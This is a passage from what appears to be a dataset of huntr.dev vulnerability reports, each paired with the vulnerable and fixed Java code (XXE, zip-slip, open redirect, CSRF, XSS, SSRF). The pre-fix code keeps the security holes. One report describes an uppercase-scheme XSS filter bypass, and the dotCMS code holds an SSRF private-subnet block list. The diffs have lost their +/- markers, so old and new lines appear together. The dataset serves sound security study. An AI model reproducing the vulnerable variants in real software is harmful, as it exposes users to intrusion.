import com.dotmarketing.exception.DotRuntimeException;
import com.dotmarketing.util.Config;
import com.dotmarketing.util.Logger;
import com.dotmarketing.util.UtilMethods;
import io.vavr.Lazy;
import io.vavr.control.Try;

public class IPUtils {
@@ -43,9 +43,14 @@ public static boolean isIpInCIDR(final String ip, final String CIDR) {

    }

    final static private String[] privateSubnets = {""10.0.0.0/8"",""172.16.0.0/12"", ""192.168.0.0/16""};
    final static private String[] REMOTE_CALL_SUBNET_BLACKLIST_DEFAULT = {""127.0.0.1/32"",""10.0.0.0/8"",""172.16.0.0/12"", ""192.168.0.0/16""};


    final static Lazy<String[]> disallowedSubnets = Lazy.of(() -> 
                    Try.of(() -> Config.getStringArrayProperty(""REMOTE_CALL_SUBNET_BLACKLIST"", REMOTE_CALL_SUBNET_BLACKLIST_DEFAULT))
                    .getOrElse(REMOTE_CALL_SUBNET_BLACKLIST_DEFAULT));



    /**
     * It is important when we allow calling to remote endpoints that we verify
@@ -57,24 +62,18 @@ public static boolean isIpInCIDR(final String ip, final String CIDR) {
     */
    public static boolean isIpPrivateSubnet(final String ipOrHostName) {



        if (ipOrHostName == null) {
            return true;
        }

        try {
            InetAddress addr = Address.getByName(ipOrHostName);

            final String ip = addr.getHostAddress();
            final String ip = ""localhost"".equals(ipOrHostName) ? ""127.0.0.1"" : Address.getByName(ipOrHostName).getHostAddress();

            if (""127.0.0.1"".equals(ip)) {
                return true;
            }

            if (""localhost"".equals(ip)) {
                return true;
            }

            for (String subnet : privateSubnets) {
            for (String subnet : disallowedSubnets.get()) {
                if (isIpInCIDR(ip, subnet)) {
                    return true;
                }
3
dotCMS/src/test/java/com/dotcms/util/network/IPUtilsTest.java
@@ -64,7 +64,8 @@ public void test_false_cases() {
            ""127.0.0.1"",
            ""172.16.3.5"",
            ""172.16.3.0"",
            ""localhost""
            ""localhost"",
            ""127.0.0.1""
    };

    final static String[] ipsOnPublicSubnets= {"
https://huntr.dev/bounties/0d093863-29e8-4dd7-a885-64f76d50bf5e/,Improper Restriction of XML External Entity Reference in skylot/jadx,"parseXml() function in ExportGradleProject is not secured against XXE because it does not include the disallow-doctype-decl attribute, therefore JADX is vulnerable to XXE when parsing a malicious Android Manifest when exporting Android app to Gradle. In",CVE-2022-0219,CWE-611: Improper Restriction of XML External Entity Reference,https://www.github.com/skylot/jadx/commit/d22db30166e7cb369d72be41382bb63ac8b81c52,"@@ -8,7 +8,6 @@
import java.util.Set;

import javax.xml.parsers.DocumentBuilder;
import javax.xml.parsers.DocumentBuilderFactory;

import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
@@ -24,6 +23,7 @@
import jadx.core.utils.exceptions.JadxRuntimeException;
import jadx.core.utils.files.FileUtils;
import jadx.core.xmlgen.ResContainer;


public class ExportGradleProject {

@@ -139,7 +139,7 @@ private ApplicationParams getApplicationParams(Document androidManifest, Documen

 private Document parseXml(String xmlContent) {
  try {
   DocumentBuilder builder = DocumentBuilderFactory.newInstance().newDocumentBuilder();
   Document document = builder.parse(new InputSource(new StringReader(xmlContent)));

   document.getDocumentElement().normalize();

","4
jadx-core/src/main/java/jadx/core/export/ExportGradleProject.java
@@ -8,7 +8,6 @@
import java.util.Set;

import javax.xml.parsers.DocumentBuilder;
import javax.xml.parsers.DocumentBuilderFactory;

import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
@@ -24,6 +23,7 @@
import jadx.core.utils.exceptions.JadxRuntimeException;
import jadx.core.utils.files.FileUtils;
import jadx.core.xmlgen.ResContainer;
import jadx.core.xmlgen.XmlSecurity;

public class ExportGradleProject {

@@ -139,7 +139,7 @@ private ApplicationParams getApplicationParams(Document androidManifest, Documen

 private Document parseXml(String xmlContent) {
  try {
   DocumentBuilder builder = DocumentBuilderFactory.newInstance().newDocumentBuilder();
   DocumentBuilder builder = XmlSecurity.getSecureDbf().newDocumentBuilder();
   Document document = builder.parse(new InputSource(new StringReader(xmlContent)));

   document.getDocumentElement().normalize();"
https://huntr.dev/bounties/a717aec2-5646-4a5f-ade0-dadc25736ae3/,Improper Restriction of XML External Entity Reference in stanfordnlp/corenlp,"When a malicious schema XML file is passed to getValidatingXmlParser(), the parser is vulnerable to XXE when the SchemaFactory parses the schema XML file.",CVE-2022-0239,CWE-611: Improper Restriction of XML External Entity Reference,https://www.github.com/stanfordnlp/corenlp/commit/1940ffb938dc4f3f5bc5f2a2fd8b35aabbbae3dd,"@@ -302,6 +302,7 @@ public static DocumentBuilder getValidatingXmlParser(File schemaFile) {
      DocumentBuilderFactory dbf = safeDocumentBuilderFactory();

      SchemaFactory factory = SchemaFactory.newInstance(XMLConstants.W3C_XML_SCHEMA_NS_URI);

      Schema schema = factory.newSchema(schemaFile);
      dbf.setSchema(schema);


","1
src/edu/stanford/nlp/util/XMLUtils.java
@@ -302,6 +302,7 @@ public static DocumentBuilder getValidatingXmlParser(File schemaFile) {
      DocumentBuilderFactory dbf = safeDocumentBuilderFactory();

      SchemaFactory factory = SchemaFactory.newInstance(XMLConstants.W3C_XML_SCHEMA_NS_URI);
      factory.setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, true);
      Schema schema = factory.newSchema(schemaFile);
      dbf.setSchema(schema);"
https://huntr.dev/bounties/3d7e70fe-dddd-4b79-af62-8e058c4d5763/,Improper Restriction of XML External Entity Reference in stanfordnlp/corenlp,"The TransformXML() function makes use of SAXParser generated from a SAXParserFactory with no FEATURE_SECURE_PROCESSING set, allowing for XXE attacks. In",CVE-2022-0198,CWE-611: Improper Restriction of XML External Entity Reference,https://www.github.com/stanfordnlp/corenlp/commit/1f52136321cfca68b991bd7870563d06cf96624d,"@@ -5,6 +5,7 @@
import java.io.*;
import java.util.*;


import javax.xml.parsers.SAXParser;
import javax.xml.parsers.SAXParserFactory;

@@ -195,6 +196,8 @@ public void processText(String text) {

  public TransformXML() {
    try {


      saxParser = SAXParserFactory.newInstance().newSAXParser();
    } catch (Exception e) {
      log.info(""Error configuring XML parser: "" + e);

","3
src/edu/stanford/nlp/process/TransformXML.java
@@ -5,6 +5,7 @@
import java.io.*;
import java.util.*;

import javax.xml.XMLConstants;
import javax.xml.parsers.SAXParser;
import javax.xml.parsers.SAXParserFactory;

@@ -195,6 +196,8 @@ public void processText(String text) {

  public TransformXML() {
    try {
      SAXParserFactory spf = SAXParserFactory.newInstance();
      spf.setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, true);
      saxParser = SAXParserFactory.newInstance().newSAXParser();
    } catch (Exception e) {
      log.info(""Error configuring XML parser: "" + e);"
https://huntr.dev/bounties/5c6d8dcf-6be1-4314-ace6-a40d6efd393b/,Path Traversal in konloch/bytecode-viewer,"the.bytecode.club:Bytecode-Viewer is a lightweight user-friendly Java/Android Bytecode Viewer, Decompiler & More.",CVE-2022-21675,CWE-22: Path Traversal,https://www.github.com/konloch/bytecode-viewer/commit/c968e94b2c93da434a4ecfac6d08eda162d615d0,"@@ -35,6 +35,7 @@
 */
public final class ZipUtils {


    /**
     * Unzip files to path.
     *
@@ -67,6 +68,11 @@ public static void unzipFilesToPath(String jarPath, String destinationDir) throw
                String fileName = destinationDir + File.separator + entry.getName();
                File f = new File(fileName);






                File parent = f.getParentFile();
                if (!parent.exists()) {
                    parent.mkdirs();
@@ -106,15 +112,15 @@ public static void zipFile(File inputFile, File outputZip) {

    public static void zipFolder(String srcFolder, String destZipFile, String ignore) throws Exception {
        try (FileOutputStream fileWriter = new FileOutputStream(destZipFile);
             ZipOutputStream zip = new ZipOutputStream(fileWriter)){
            addFolderToZip("""", srcFolder, zip, ignore);
            zip.flush();
        }
    }

    public static void zipFolderAPKTool(String srcFolder, String destZipFile) throws Exception {
        try (FileOutputStream fileWriter = new FileOutputStream(destZipFile);
             ZipOutputStream zip = new ZipOutputStream(fileWriter)){
            addFolderToZipAPKTool("""", srcFolder, zip);
            zip.flush();
        }
@@ -199,4 +205,4 @@ public static void addFolderToZipAPKTool(String path, String srcFolder, ZipOutpu
            }
        }
    }
}
","12
src/main/java/the/bytecode/club/bytecodeviewer/util/ZipUtils.java
@@ -35,6 +35,7 @@
 */
public final class ZipUtils {

    // TODO: Maybe migrate to org.apache.commons.compress.archivers.examples.Expander?
    /**
     * Unzip files to path.
     *
@@ -67,6 +68,11 @@ public static void unzipFilesToPath(String jarPath, String destinationDir) throw
                String fileName = destinationDir + File.separator + entry.getName();
                File f = new File(fileName);

                if (!f.getCanonicalPath().startsWith(destinationDir)) {
                    System.out.println(""Zip Slip exploit detected. Skipping entry "" + entry.getName());
                    continue;
                }

                File parent = f.getParentFile();
                if (!parent.exists()) {
                    parent.mkdirs();
@@ -106,15 +112,15 @@ public static void zipFile(File inputFile, File outputZip) {

    public static void zipFolder(String srcFolder, String destZipFile, String ignore) throws Exception {
        try (FileOutputStream fileWriter = new FileOutputStream(destZipFile);
             ZipOutputStream zip = new ZipOutputStream(fileWriter)){
             ZipOutputStream zip = new ZipOutputStream(fileWriter)) {
            addFolderToZip("""", srcFolder, zip, ignore);
            zip.flush();
        }
    }

    public static void zipFolderAPKTool(String srcFolder, String destZipFile) throws Exception {
        try (FileOutputStream fileWriter = new FileOutputStream(destZipFile);
             ZipOutputStream zip = new ZipOutputStream(fileWriter)){
             ZipOutputStream zip = new ZipOutputStream(fileWriter)) {
            addFolderToZipAPKTool("""", srcFolder, zip);
            zip.flush();
        }
@@ -199,4 +205,4 @@ public static void addFolderToZipAPKTool(String path, String srcFolder, ZipOutpu
            }
        }
    }
}
}"
https://huntr.dev/bounties/eb681144-04f2-4eaa-98b6-c8cffbcb1601/,Cross-site Scripting (XSS) - Stored in erudika/scoold,"The Schold is a Q&A/knowledge base platform written in Java. When writing a Q&A, you can use the markdown editor. So I tried to exploit the []() syntax to try an XSS attack. It seemed to validate javascript:* on the backend. So I couldn't use it. However, according to RFC3986, the scheme can use uppercase letters! So I was able to bypass it using this.",,CWE-79: Cross-site Scripting (XSS) - Stored,https://www.github.com/erudika/scoold/commit/ae3e5ee6c806750371c208ba1ca64d610f6ad40b,"@@ -66,7 +66,7 @@
  <dependency>
   <groupId>com.erudika</groupId>
   <artifactId>para-client</artifactId>
   <version>1.43.2</version>
  </dependency>

  <!-- VELOCITY -->

","2
pom.xml
@@ -66,7 +66,7 @@
  <dependency>
   <groupId>com.erudika</groupId>
   <artifactId>para-client</artifactId>
   <version>1.43.2</version>
   <version>1.43.3</version>
  </dependency>

  <!-- VELOCITY -->"
https://huntr.dev/bounties/c247dcf1-5bb9-41c4-9e29-dee79c507002/,Open Redirect in erudika/scoold,"Hi erudika scoold team, there is an Open redirect in your source code at question url",,CWE-601: Open Redirect,https://www.github.com/erudika/scoold/commit/6b9543ac9c005adcf43cb56cf076fcdd026a6b87,"@@ -273,11 +273,11 @@ public String setSpace(@PathVariable(required = false) String space,
   }
  }
  utils.storeSpaceIdInCookie(space, req, res);
  String backTo = req.getParameter(""returnto"");
  if (StringUtils.isBlank(backTo)) {
   return get(req.getParameter(""sortby""), req, model);
  } else {
   return ""redirect:"" + (StringUtils.isBlank(backTo) ? QUESTIONSLINK : backTo);
  }
 }


","4
src/main/java/com/erudika/scoold/controllers/QuestionsController.java
@@ -273,11 +273,11 @@ public String setSpace(@PathVariable(required = false) String space,
   }
  }
  utils.storeSpaceIdInCookie(space, req, res);
  String backTo = req.getParameter(""returnto"");
  String backTo = HttpUtils.getBackToUrl(req);
  if (StringUtils.isBlank(backTo)) {
   return get(req.getParameter(""sortby""), req, model);
  } else {
   return ""redirect:"" + (StringUtils.isBlank(backTo) ? QUESTIONSLINK : backTo);
   return ""redirect:"" + backTo;
  }
 }"
https://huntr.dev/bounties/d5651190-a228-480c-8bc0-28797c76240c/,Cross-Site Request Forgery (CSRF) in erudika/scoold,"Hi there, I would like to report a CSRF vulnerability in erudika/scoold. This allows an attacker to change the current user question space or add them to default space against their will.",,CWE-352: Cross-Site Request Forgery (CSRF),https://www.github.com/erudika/scoold/commit/ee59dd919c89accc6f4362737e3ed5968f71a205,"@@ -62,7 +62,7 @@ public String post(@PathVariable String langkey, HttpServletRequest req, HttpSer
  Locale locale = utils.getCurrentLocale(langkey);
  if (locale != null) {
   int maxAge = 60 * 60 * 24 * 365;  //1 year
   HttpUtils.setRawCookie(LOCALE_COOKIE, locale.toString(), req, res, false, maxAge);
  }
  return ""redirect:"" + LANGUAGESLINK;
 }

@@ -172,7 +172,7 @@ public String applyFilter(@RequestParam(required = false) String sortby, @Reques
   }
   savePagerToCookie(req, res, p);
   HttpUtils.setRawCookie(""questions-view-compact"", compactViewEnabled,
     req, res, false, (int) TimeUnit.DAYS.toSeconds(365));
  }
  return ""redirect:"" + QUESTIONSLINK + (StringUtils.isBlank(sortby) ? """" : ""?sortby=""
    + Optional.ofNullable(StringUtils.trimToNull(tab)).orElse(sortby));
@@ -403,7 +403,7 @@ public String getName() {
 private void savePagerToCookie(HttpServletRequest req, HttpServletResponse res, Pager p) {
  try {
   HttpUtils.setRawCookie(""questions-filter"", Utils.base64enc(ParaObjectUtils.getJsonWriterNoIdent().
     writeValueAsBytes(p)), req, res, false, (int) TimeUnit.DAYS.toSeconds(365));
  } catch (JsonProcessingException ex) { }
 }


@@ -124,7 +124,7 @@ public static void setStateParam(String name, String value, HttpServletRequest r
  */
 public static void setStateParam(String name, String value, HttpServletRequest req,
   HttpServletResponse res, boolean httpOnly) {
  setRawCookie(name, value, req, res, httpOnly, -1);
 }

 /**
@@ -145,7 +145,7 @@ public static String getStateParam(String name, HttpServletRequest req) {
  */
 public static void removeStateParam(String name, HttpServletRequest req,
   HttpServletResponse res) {
  setRawCookie(name, """", req, res, false, 0);
 }

 /**
@@ -155,19 +155,32 @@ public static void removeStateParam(String name, HttpServletRequest req,
  * @param req HTTP request
  * @param res HTTP response
  * @param httpOnly HTTP only flag

  * @param maxAge max age
  */
 public static void setRawCookie(String name, String value, HttpServletRequest req,
   HttpServletResponse res, boolean httpOnly, int maxAge) {
  if (StringUtils.isBlank(name) || value == null || req == null || res == null) {
   return;
  }
  Cookie cookie = new Cookie(name, value);
  cookie.setHttpOnly(httpOnly);
  cookie.setMaxAge(maxAge < 0 ? Config.SESSION_TIMEOUT_SEC : maxAge);
  cookie.setPath(CONTEXT_PATH.isEmpty() ? ""/"" : CONTEXT_PATH);
  cookie.setSecure(StringUtils.startsWithIgnoreCase(ScooldServer.getServerURL(), ""https://"") || req.isSecure());
  res.addCookie(cookie);












 }

 /**
@@ -291,21 +304,7 @@ public static void setAuthCookie(String jwt, HttpServletRequest req, HttpServlet
  if (StringUtils.isBlank(jwt)) {
   return;
  }
  int maxAge = Config.SESSION_TIMEOUT_SEC;
  String expires = DateFormatUtils.format(System.currentTimeMillis() + (maxAge * 1000),
    ""EEE, dd-MMM-yyyy HH:mm:ss z"", TimeZone.getTimeZone(""GMT""));
  String path = CONTEXT_PATH.isEmpty() ? ""/"" : CONTEXT_PATH;
  StringBuilder sb = new StringBuilder();
  sb.append(AUTH_COOKIE).append(""="").append(jwt).append("";"");
  sb.append(""Path="").append(path).append("";"");
  sb.append(""Expires="").append(expires).append("";"");
  sb.append(""Max-Age="").append(maxAge).append("";"");
  sb.append(""HttpOnly;"");
  if (StringUtils.startsWithIgnoreCase(ScooldServer.getServerURL(), ""https://"") || req.isSecure()) {
   sb.append(""Secure;"");
  }
  sb.append(""SameSite=Lax"");
  res.addHeader(javax.ws.rs.core.HttpHeaders.SET_COOKIE, sb.toString());
 }

 /**

@@ -1192,7 +1192,7 @@ public void storeSpaceIdInCookie(String space, HttpServletRequest req, HttpServl
  // used for setting the space from a direct URL to a particular space
  req.setAttribute(SPACE_COOKIE, space);
  HttpUtils.setRawCookie(SPACE_COOKIE, Utils.base64encURL(space.getBytes()),
    req, res, false, StringUtils.isBlank(space) ? 0 : 365 * 24 * 60 * 60);
 }

 public String verifyExistingSpace(Profile authUser, String space) {

","2
src/main/java/com/erudika/scoold/controllers/LanguagesController.java
@@ -62,7 +62,7 @@ public String post(@PathVariable String langkey, HttpServletRequest req, HttpSer
  Locale locale = utils.getCurrentLocale(langkey);
  if (locale != null) {
   int maxAge = 60 * 60 * 24 * 365;  //1 year
   HttpUtils.setRawCookie(LOCALE_COOKIE, locale.toString(), req, res, false, maxAge);
   HttpUtils.setRawCookie(LOCALE_COOKIE, locale.toString(), req, res, false, ""Strict"", maxAge);
  }
  return ""redirect:"" + LANGUAGESLINK;
 }
4
src/main/java/com/erudika/scoold/controllers/QuestionsController.java
@@ -172,7 +172,7 @@ public String applyFilter(@RequestParam(required = false) String sortby, @Reques
   }
   savePagerToCookie(req, res, p);
   HttpUtils.setRawCookie(""questions-view-compact"", compactViewEnabled,
     req, res, false, (int) TimeUnit.DAYS.toSeconds(365));
     req, res, false, ""Strict"", (int) TimeUnit.DAYS.toSeconds(365));
  }
  return ""redirect:"" + QUESTIONSLINK + (StringUtils.isBlank(sortby) ? """" : ""?sortby=""
    + Optional.ofNullable(StringUtils.trimToNull(tab)).orElse(sortby));
@@ -403,7 +403,7 @@ public String getName() {
 private void savePagerToCookie(HttpServletRequest req, HttpServletResponse res, Pager p) {
  try {
   HttpUtils.setRawCookie(""questions-filter"", Utils.base64enc(ParaObjectUtils.getJsonWriterNoIdent().
     writeValueAsBytes(p)), req, res, false, (int) TimeUnit.DAYS.toSeconds(365));
     writeValueAsBytes(p)), req, res, false, ""Strict"", (int) TimeUnit.DAYS.toSeconds(365));
  } catch (JsonProcessingException ex) { }
 }

47
src/main/java/com/erudika/scoold/utils/HttpUtils.java
@@ -124,7 +124,7 @@ public static void setStateParam(String name, String value, HttpServletRequest r
  */
 public static void setStateParam(String name, String value, HttpServletRequest req,
   HttpServletResponse res, boolean httpOnly) {
  setRawCookie(name, value, req, res, httpOnly, -1);
  setRawCookie(name, value, req, res, httpOnly, null, -1);
 }

 /**
@@ -145,7 +145,7 @@ public static String getStateParam(String name, HttpServletRequest req) {
  */
 public static void removeStateParam(String name, HttpServletRequest req,
   HttpServletResponse res) {
  setRawCookie(name, """", req, res, false, 0);
  setRawCookie(name, """", req, res, false, null, 0);
 }

 /**
@@ -155,19 +155,32 @@ public static void removeStateParam(String name, HttpServletRequest req,
  * @param req HTTP request
  * @param res HTTP response
  * @param httpOnly HTTP only flag
  * @param sameSite SameSite flag
  * @param maxAge max age
  */
 public static void setRawCookie(String name, String value, HttpServletRequest req,
   HttpServletResponse res, boolean httpOnly, int maxAge) {
   HttpServletResponse res, boolean httpOnly, String sameSite, int maxAge) {
  if (StringUtils.isBlank(name) || value == null || req == null || res == null) {
   return;
  }
  Cookie cookie = new Cookie(name, value);
  cookie.setHttpOnly(httpOnly);
  cookie.setMaxAge(maxAge < 0 ? Config.SESSION_TIMEOUT_SEC : maxAge);
  cookie.setPath(CONTEXT_PATH.isEmpty() ? ""/"" : CONTEXT_PATH);
  cookie.setSecure(StringUtils.startsWithIgnoreCase(ScooldServer.getServerURL(), ""https://"") || req.isSecure());
  res.addCookie(cookie);
  String expires = DateFormatUtils.format(System.currentTimeMillis() + (maxAge * 1000),
    ""EEE, dd-MMM-yyyy HH:mm:ss z"", TimeZone.getTimeZone(""GMT""));
  String path = CONTEXT_PATH.isEmpty() ? ""/"" : CONTEXT_PATH;
  StringBuilder sb = new StringBuilder();
  sb.append(name).append(""="").append(value).append("";"");
  sb.append(""Path="").append(path).append("";"");
  sb.append(""Expires="").append(expires).append("";"");
  sb.append(""Max-Age="").append(maxAge < 0 ? Config.SESSION_TIMEOUT_SEC : maxAge).append("";"");
  if (httpOnly) {
   sb.append(""HttpOnly;"");
  }
  if (StringUtils.startsWithIgnoreCase(ScooldServer.getServerURL(), ""https://"") || req.isSecure()) {
   sb.append(""Secure;"");
  }
  if (!StringUtils.isBlank(sameSite)) {
   sb.append(""SameSite="").append(sameSite);
  }
  res.addHeader(javax.ws.rs.core.HttpHeaders.SET_COOKIE, sb.toString());
 }

 /**
@@ -291,21 +304,7 @@ public static void setAuthCookie(String jwt, HttpServletRequest req, HttpServlet
  if (StringUtils.isBlank(jwt)) {
   return;
  }
  int maxAge = Config.SESSION_TIMEOUT_SEC;
  String expires = DateFormatUtils.format(System.currentTimeMillis() + (maxAge * 1000),
    ""EEE, dd-MMM-yyyy HH:mm:ss z"", TimeZone.getTimeZone(""GMT""));
  String path = CONTEXT_PATH.isEmpty() ? ""/"" : CONTEXT_PATH;
  StringBuilder sb = new StringBuilder();
  sb.append(AUTH_COOKIE).append(""="").append(jwt).append("";"");
  sb.append(""Path="").append(path).append("";"");
  sb.append(""Expires="").append(expires).append("";"");
  sb.append(""Max-Age="").append(maxAge).append("";"");
  sb.append(""HttpOnly;"");
  if (StringUtils.startsWithIgnoreCase(ScooldServer.getServerURL(), ""https://"") || req.isSecure()) {
   sb.append(""Secure;"");
  }
  sb.append(""SameSite=Lax"");
  res.addHeader(javax.ws.rs.core.HttpHeaders.SET_COOKIE, sb.toString());
  setRawCookie(AUTH_COOKIE, jwt, req, res, true, ""Lax"", Config.SESSION_TIMEOUT_SEC);
 }

 /**
2
src/main/java/com/erudika/scoold/utils/ScooldUtils.java
@@ -1192,7 +1192,7 @@ public void storeSpaceIdInCookie(String space, HttpServletRequest req, HttpServl
  // used for setting the space from a direct URL to a particular space
  req.setAttribute(SPACE_COOKIE, space);
  HttpUtils.setRawCookie(SPACE_COOKIE, Utils.base64encURL(space.getBytes()),
    req, res, false, StringUtils.isBlank(space) ? 0 : 365 * 24 * 60 * 60);
    req, res, true, ""Strict"", StringUtils.isBlank(space) ? 0 : 365 * 24 * 60 * 60);
 }

 public String verifyExistingSpace(Profile authUser, String space) {"
https://huntr.dev/bounties/1625938491908-Erudika/scoold/,Reliance on Cookies without Validation and Integrity Checking in erudika/scoold,"The cookies are not expiring after sign out. Once the user signs out of his account, the cookies needs to be expired and should not be any use of reuse. But in this case, an attacker can grab the cookies and use them to log them into a user's account",,CWE-565: Reliance on Cookies without Validation and Integrity Checking,https://www.github.com/erudika/scoold/commit/c251891a79812c960758486c5f0dde430988b3b8,"@@ -174,8 +174,8 @@ public final class ScooldUtils {
  WHITELISTED_MACROS.put(""tags"", ""#tagspage($tagslist)"");
 }

 private ParaClient pc;
 private LanguageUtils langutils;
 private static ScooldUtils instance;
 @Inject private Emailer emailer;

@@ -1465,7 +1465,17 @@ public String getFullAvatarURL(Profile profile) {

 public void clearSession(HttpServletRequest req, HttpServletResponse res) {
  if (req != null) {
   HttpUtils.removeStateParam(AUTH_COOKIE, req, res);










   HttpUtils.removeStateParam(""dark-mode"", req, res);
  }
 }

","16
src/main/java/com/erudika/scoold/utils/ScooldUtils.java
@@ -174,8 +174,8 @@ public final class ScooldUtils {
  WHITELISTED_MACROS.put(""tags"", ""#tagspage($tagslist)"");
 }

 private ParaClient pc;
 private LanguageUtils langutils;
 private final ParaClient pc;
 private final LanguageUtils langutils;
 private static ScooldUtils instance;
 @Inject private Emailer emailer;

@@ -1465,7 +1465,17 @@ public String getFullAvatarURL(Profile profile) {

 public void clearSession(HttpServletRequest req, HttpServletResponse res) {
  if (req != null) {
   HttpUtils.removeStateParam(AUTH_COOKIE, req, res);
   String jwt = HttpUtils.getStateParam(AUTH_COOKIE, req);
   if (!StringUtils.isBlank(jwt)) {
    if (Config.getConfigBoolean(""security.one_session_per_user"", true)) {
     synchronized (pc) {
      pc.setAccessToken(jwt);
      pc.revokeAllTokens();
      pc.signOut();
     }
    }
    HttpUtils.removeStateParam(AUTH_COOKIE, req, res);
   }
   HttpUtils.removeStateParam(""dark-mode"", req, res);
  }
 }"
https://huntr.dev/bounties/e903dacf-396c-4c9f-b7b3-3138182a3488/,Server-Side Request Forgery (SSRF) in dotcms/core,"Hi team, I found a SSRF that allow me to access the elasticsearch API and get full response from the querys",,CWE-918: Server-Side Request Forgery (SSRF),https://www.github.com/dotcms/core/commit/ccad0938fd85dc951ea37393b70a1de7829d1eca,"@@ -9,6 +9,7 @@
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;

import java.net.URL;
import java.nio.file.Files;
import java.util.ArrayList;
@@ -18,19 +19,23 @@
import java.util.Optional;

import javax.servlet.http.HttpServletRequest;



import com.dotcms.http.CircuitBreakerUrl;
import com.dotcms.http.CircuitBreakerUrl.Method;
import com.dotcms.util.CloseUtils;
import com.dotcms.util.ConversionUtils;
import com.dotcms.util.SecurityUtils;

import com.dotmarketing.business.APILocator;
import com.dotmarketing.business.DotStateException;
import com.dotmarketing.business.UserAPI;
import com.dotmarketing.business.web.WebAPILocator;
import com.dotmarketing.exception.DotRuntimeException;
import com.dotmarketing.exception.DotSecurityException;
import com.dotmarketing.util.Config;

import com.dotmarketing.util.FileUtil;
import com.dotmarketing.util.Logger;
import com.dotmarketing.util.SecurityLogger;
@@ -60,6 +65,9 @@ public class TempFileAPI {
  public static final String TEMP_RESOURCE_PREFIX = ""temp_"";

  private static final String WHO_CAN_USE_TEMP_FILE = ""whoCanUse.tmp"";




  /**
   * Returns an empty TempFile of a unique id and file handle that can be used to write and access a
@@ -200,14 +208,45 @@ public DotTempFile createTempFileFromUrl(final String incomingFileName,
      final DotTempFile dotTempFile = createEmptyTempFile(fileName, request);
      final File tempFile = dotTempFile.file;

      final OutputStream out = new BoundedOutputStream(maxFileSize(request),
                      Files.newOutputStream(tempFile.toPath()));

      final CircuitBreakerUrl urlGetter =
              CircuitBreakerUrl.builder().setMethod(Method.GET).setUrl(url.toString())
                      .setTimeout(timeoutSeconds * 1000).build();



























      urlGetter.doOut(out);






      return dotTempFile;


@@ -1,7 +1,11 @@
package com.dotcms.util.network;


import java.util.Objects;

import com.dotcms.repackage.org.apache.commons.net.util.SubnetUtils;


import com.dotmarketing.util.UtilMethods;
import io.vavr.control.Try;

@@ -38,4 +42,53 @@ public static boolean isIpInCIDR(final String ip, final String CIDR) {


    }

















































}
@@ -56,4 +56,39 @@ public void test_false_cases() {
        }

    }



































}
","55
dotCMS/src/main/java/com/dotcms/rest/api/v1/temp/TempFileAPI.java
@@ -9,6 +9,7 @@
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.InetAddress;
import java.net.URL;
import java.nio.file.Files;
import java.util.ArrayList;
@@ -18,19 +19,23 @@
import java.util.Optional;

import javax.servlet.http.HttpServletRequest;

import org.xbill.DNS.Address;
import org.xbill.DNS.ExtendedResolver;
import org.xbill.DNS.Resolver;
import com.dotcms.http.CircuitBreakerUrl;
import com.dotcms.http.CircuitBreakerUrl.Method;
import com.dotcms.util.CloseUtils;
import com.dotcms.util.ConversionUtils;
import com.dotcms.util.SecurityUtils;
import com.dotcms.util.network.IPUtils;
import com.dotmarketing.business.APILocator;
import com.dotmarketing.business.DotStateException;
import com.dotmarketing.business.UserAPI;
import com.dotmarketing.business.web.WebAPILocator;
import com.dotmarketing.exception.DotRuntimeException;
import com.dotmarketing.exception.DotSecurityException;
import com.dotmarketing.util.Config;
import com.dotmarketing.util.DNSUtil;
import com.dotmarketing.util.FileUtil;
import com.dotmarketing.util.Logger;
import com.dotmarketing.util.SecurityLogger;
@@ -60,6 +65,9 @@ public class TempFileAPI {
  public static final String TEMP_RESOURCE_PREFIX = ""temp_"";

  private static final String WHO_CAN_USE_TEMP_FILE = ""whoCanUse.tmp"";
  private static final String TEMP_RESOURCE_BY_URL_ADMIN_ONLY=""TEMP_RESOURCE_BY_URL_ADMIN_ONLY"";



  /**
   * Returns an empty TempFile of a unique id and file handle that can be used to write and access a
@@ -200,14 +208,45 @@ public DotTempFile createTempFileFromUrl(final String incomingFileName,
      final DotTempFile dotTempFile = createEmptyTempFile(fileName, request);
      final File tempFile = dotTempFile.file;

      final OutputStream out = new BoundedOutputStream(maxFileSize(request),
                      Files.newOutputStream(tempFile.toPath()));

      final CircuitBreakerUrl urlGetter =
              CircuitBreakerUrl.builder().setMethod(Method.GET).setUrl(url.toString())
                      .setTimeout(timeoutSeconds * 1000).build();

      final boolean tempFilesByUrlAdminOnly = Config
                      .getBooleanProperty(TEMP_RESOURCE_BY_URL_ADMIN_ONLY, false);


      /**
       * If url requested is on a private subnet, block by default
       */
      if(IPUtils.isIpPrivateSubnet(url.getHost())) {
          throw new DotRuntimeException(""Unable to load file by url:"" + url);
      }


      /**
       * by adding the source IP give visibility to the 
       * remote server of who initiatied the reuqest
       */
      final String sourceIpAddress = request.getRemoteAddr();
      final String finalUrl = url.toString().contains(""?"") ? url.toString() + ""&sourceIp="" + sourceIpAddress :  url.toString() + ""?sourceIp="" + sourceIpAddress ;



      /**
       * Only allow admins to use the URL functionality
       */
      User user = PortalUtil.getUser(request);
      if(user == null || tempFilesByUrlAdminOnly && !user.isAdmin()) {
          throw new DotRuntimeException(""Only Admins can import a file by URL"");
      }

      try(final OutputStream out = new BoundedOutputStream(maxFileSize(request),
                      Files.newOutputStream(tempFile.toPath()))){

      urlGetter.doOut(out);
              final CircuitBreakerUrl urlGetter =
                      CircuitBreakerUrl.builder().setMethod(Method.GET).setUrl(finalUrl)
                              .setTimeout(timeoutSeconds * 1000).build();

              urlGetter.doOut(out);
      }

      return dotTempFile;

53
dotCMS/src/main/java/com/dotcms/util/network/IPUtils.java
@@ -1,7 +1,11 @@
package com.dotcms.util.network;

import java.net.InetAddress;
import java.util.Objects;
import org.xbill.DNS.Address;
import com.dotcms.repackage.org.apache.commons.net.util.SubnetUtils;
import com.dotmarketing.exception.DotRuntimeException;
import com.dotmarketing.util.Logger;
import com.dotmarketing.util.UtilMethods;
import io.vavr.control.Try;

@@ -38,4 +42,53 @@ public static boolean isIpInCIDR(final String ip, final String CIDR) {


    }

    final static private String[] privateSubnets = {""10.0.0.0/8"",""172.16.0.0/12"", ""192.168.0.0/16""};



    /**
     * It is important when we allow calling to remote endpoints that we verify
     * that the remote endpoint is not in our corprate or private network.
     * This method checks if the ip or hostname passed in is on the private network
